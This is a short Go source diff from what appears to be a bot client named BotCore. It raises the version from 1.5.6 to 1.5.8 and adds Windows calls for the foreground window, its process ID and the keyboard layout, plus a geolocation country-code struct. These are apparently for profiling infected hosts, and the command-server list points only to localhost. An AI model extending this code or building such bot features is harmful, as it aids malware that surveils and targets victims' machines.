@@ -67,14 +67,16 @@ var (
 	pfnGetModuleBaseNameW   = psapi.NewProc("GetModuleBaseNameW")
 	pfnOpenProcess          = kernel32.NewProc("OpenProcess")
 	pfnCloseHandle          = kernel32.NewProc("CloseHandle")
-	pfnGetLastError         = kernel32.NewProc("GetLastError")
 	pfnGetTokenInformation  = advapi32.NewProc("GetTokenInformation")
 	pfnOpenProcessToken     = advapi32.NewProc("OpenProcessToken")
 	pfnGetCurrentProcess    = kernel32.NewProc("GetCurrentProcess")
 	pfnGetVolumeInformation = kernel32.NewProc("GetVolumeInformationW")
+	pfnGetForegroundWindow  = user32.NewProc("GetForegroundWindow")
+	pfnGetWindowThreadPID   = user32.NewProc("GetWindowThreadProcessId")
+	pfnGetKeyboardLayout    = user32.NewProc("GetKeyboardLayout")
 
 	botcore = BotCore{
-		version:       "1.5.6",
+		version:       "1.5.8",
 		hosts:         []string{"127.0.0.1:8080"},
 		singleton:     true,
 		sington_mutex: 0,
@@ -139,6 +141,10 @@ type Win32_VideoController struct {
 type Win32_ComputerSystem struct {
 	Manufacturer string
 	Model        string
+}
+
+type GeoResp struct {
+	CountryCode string `json:"countryCode"`
 }
 
 type ServerReply struct {
